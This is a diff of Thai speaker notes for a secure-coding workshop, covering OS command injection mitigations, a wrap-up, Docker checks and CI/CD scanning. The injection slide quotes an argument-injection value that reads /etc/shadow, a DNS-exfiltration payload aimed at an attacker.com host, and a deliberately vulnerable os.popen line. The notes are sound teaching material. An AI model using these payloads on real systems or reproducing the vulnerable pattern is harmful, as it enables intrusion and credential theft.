+  - "ถึงไม่มี shell metachar ก็ inject flags เข้าไปได้"
+  - เช่น `user-input = '--config=/etc/shadow'`
+- **Blind / time-based detection**:
+  - "ไม่มี output กลับ → ใช้ `sleep 10` → วัดเวลา response"
+  - "หรือ DNS exfil: `$(whoami).attacker.com` → ดู DNS log ที่ attacker domain"
+- ตัวอย่างจาก lab: `app.py` บรรทัด 87-92 — `os.popen(f"ping -c 1 {host}")` = classic shell injection
+
+---
+
+## Slide 60 (~h.v 11.11): OS Command Injection — Mitigations
+
+- **ไม่ใช้ `shell=True`**: "Python: `subprocess.run(cmd, shell=True)` ← ห้าม ใช้ array form แทน"
+- **`subprocess` ด้วย arg array**: "`subprocess.run(['ping', '-c', '1', host])` — ส่ง argument เป็น list → shell ไม่ parse metacharacters"
+- **Allowlist inputs**: "ถ้า host ต้องเป็น IP → validate ด้วย regex `^\d+\.\d+\.\d+\.\d+$` ก่อน pass ไป subprocess"
+- **`shlex.quote` ถ้าต้องสร้าง shell command**: "แต่ preferred คือไม่ใช้ shell เลย"
+- **Principle of least privilege**: "app user ไม่ควรมีสิทธิ์ write `/etc/` หรือ spawn subprocess ที่ไม่จำเป็น — container no-new-privileges + drop capabilities"
+- **Avoid calling shell tools เมื่อมี library Python ใช้**: "ใช้ `requests` แทน `curl`, `PIL` แทน `convert`, `smtplib` แทน `sendmail`"
+- ถ้ามีเวลา: แสดง bad vs good code ใน `app.py` vs `solutions/app_fixed.py`
+
+---
+
+## Slide 61 (~h.v 12.1): Wrap-up + Q&A
 
 - สรุปสั้นๆ: เราได้เรียนอะไรบ้างวันนี้
-- "ตอนนี้คุณมีทั้ง knowledge และ tools แล้ว ที่จะเริ่ม scan project ของคุณเอง"
+  - OWASP Top 10 (2025) + SDLC mapping
+  - Manual code review + Hands-on 1 (หา 12 ช่องโหว่)
+  - Tools: Semgrep, Syft, Gitleaks — hands-on Session 4
+  - ITSC MIS real-world pipeline
+  - Dynamic Testing: JWT / File Upload / OS Command Injection
+- "ตอนนี้คุณมีทั้ง knowledge และ tools แล้ว ที่จะเริ่ม scan project ของคุณเอง + เข้าใจ attack patterns"
 - ให้ดู Tools Summary table
-
----
-
-## Slide 51 (~h.v 12.2): Q&A
-
-- เปิดรับคำถาม
+- **เปิดรับคำถาม** — standalone Q&A slot ถูกรวมเข้า Wrap-up แล้ว
 - ถ้าไม่มีคำถาม: แนะนำ resources
   - OWASP Top 10 อ่านเพิ่มได้ที่ owasp.org
-  - Semgrep playground: semgrep.dev/playground — ลอง online ได้เลย
-- บอกว่า materials อยู่ที่ GitHub repo
+  - Semgrep playground: semgrep.dev/playground
+  - jwt.io debugger + JWT Tool (github.com/ticarpi/jwt_tool) สำหรับ Session 5 topics
+- ชี้ Appendix A (Docker security) + Appendix B (CI/CD integration) ใน repo = self-study
+- บอกว่า materials + slides อยู่ที่ GitHub repo
 
 ---
 
-## Slide 52 (~h.v 12.3): Thank You
+## Slide 62 (~h.v 12.2): Thank You
 
 - ขอบคุณทุกคน
 - "Happy Secure Coding!"
-- "อย่าลืม — scan early, scan often"
+- "อย่าลืม — scan early, scan often + test dynamic ก่อน deploy"
 - ให้ feedback ได้
 
 ---
 
 ## Tips สำหรับ Presenter
 
-### จัดการเวลา
-- Session 1 (45 min): ถ้าเวลาน้อย ข้าม A06-A08 ให้ผู้เรียนอ่านเอง
-- Session 4 (50 min): นี่สำคัญที่สุด อย่าข้าม ให้เวลาเต็ม
-- Docker (Part D): ถ้าเวลาไม่พอ ทำเป็น demo แทน hands-on
+### จัดการเวลา (4 ชั่วโมง total)
+- Session 1 (45 min): ถ้าเวลาน้อย ข้าม A06-A08 ให้ผู้เรียนอ่านเอง — อย่าข้าม SDLC intro เพราะเป็น foundation
+- Session 3 (30 min): ITSC MIS use case = highlight — อย่าลดเวลา
+- Session 4 (45 min): นี่สำคัญที่สุด อย่าข้าม ให้เวลาเต็ม — Docker Part D = self-study ถ้าเวลาไม่พอ
+- Session 5 (60 min): 3 topic × 20 นาที — ถ้า topic ไหนเสร็จก่อน ใช้เวลาที่เหลือ demo/Q&A
 
 ### จัดการปัญหา
 - "ถ้า tool install ไม่ผ่าน — ถามผมเลย อย่านั่งนาน"
@@ -555,18 +775,53 @@
 
 ---
 
-## Slide 53 (~h.v 13.1): Appendix Section
+## Slide 63 (~h.v 13.1): Appendix Section
 
 - "ส่วนนี้เป็น bonus content สำหรับ self-study"
-- "ครอบคลุม Docker security — Dockerfile และ docker-compose.yml"
+- "ครอบคลุม 2 appendix:
+  - **Appendix A**: Security Dockerfile & Docker Compose
+  - **Appendix B**: CI/CD Integration & Best Practices (เดิมเป็น Session 5)"
 - "ถ้าเวลาวันนี้ไม่พอ อ่านที่บ้านได้ — มีใน repo ทั้ง slides และ lab"
 - ให้ดูตัวอย่าง secure Dockerfile และ docker-compose.yml ที่ `lab/solutions/`
+- Appendix B อ้างอิง: `docs/tool-comparison.md` + GitHub Actions workflow ใน slides เดิม
 
 ---
 
-## Slide 54 (~h.v 13.2): Docker Security Scanning Checklist
+## Slide 64 (~h.v 13.2): Docker Security Scanning Checklist
 
 - "นี่คือ checklist ที่คุณเอาไปใช้กับ project ของคุณได้เลย"
 - เน้น items สำคัญ: non-root (2), multi-stage (3), pin version (4), cap_drop (10)
 - "ถ้าผ่าน 15 items นี้ Docker setup ของคุณจะปลอดภัยขึ้นมาก"
 - ให้ดู `lab/solutions/Dockerfile` และ `lab/solutions/docker-compose.yml` เป็น reference
+
+---
+
+## Appendix B: CI/CD Integration & Best Practices — Self-study Speaker Notes (was Session 5)
+
+> เนื้อหานี้เดิมอยู่ใน Session 5 — ย้ายมาเป็น self-study เพราะ overlap กับ ITSC MIS use case ที่ Session 3 ได้ cover แล้ว
+
+### B.1: Security in CI/CD Pipeline
+
+- Flow: pre-commit → PR → build → post-build → weekly
+- "ทุก stage มี security check"
+- PR check = gate สำคัญ: "ถ้า Semgrep เจอ critical → block merge"
+- Weekly scan: "ตรวจสอบเต็มรูปแบบทุกสัปดาห์"
+
+### B.2: GitHub Actions Example
+
+- อ่าน YAML ทีละ job อธิบาย
+- Semgrep action: "เพิ่มใน repo แล้วมัน scan ทุก PR อัตโนมัติ"
+- Gitleaks action: "block secrets ก่อนเข้า code"
+- "GitHub Actions config ใช้ได้เลย — copy ไปใส่ repo ได้"
+- GitLab CI / Jenkins versions อยู่ใน `docs/tool-comparison.md`
+
+### B.3: Best Practices & Security Culture
+
+- **Scan Early** — "ยิ่งเร็วยิ่งถูก ยิ่งถูกที่สุด"
+- **Automate** — "ถ้าต้องจำทุกครั้ง มันจะไม่เกิดขึ้น"
+- **Fix Critical First** — "อย่าไปแก้ low ก่อนเพราะมันง่าย — critical มีผลกระทบสูงสุด"
+- **Track Security Debt** — บันทึกและติดตาม issues
+- **Regular Updates** — อัปเดต dependencies สม่ำเสมอ
+- **Security in Every PR** — ทุก review มีมุมมอง security
+- **Security Champions** = developer ในทีมที่เป็น security expert คนแรกที่ถาม
+- สำหรับ reference architecture จริง กลับไปดู slide ITSC MIS Use Case ที่ Session 3
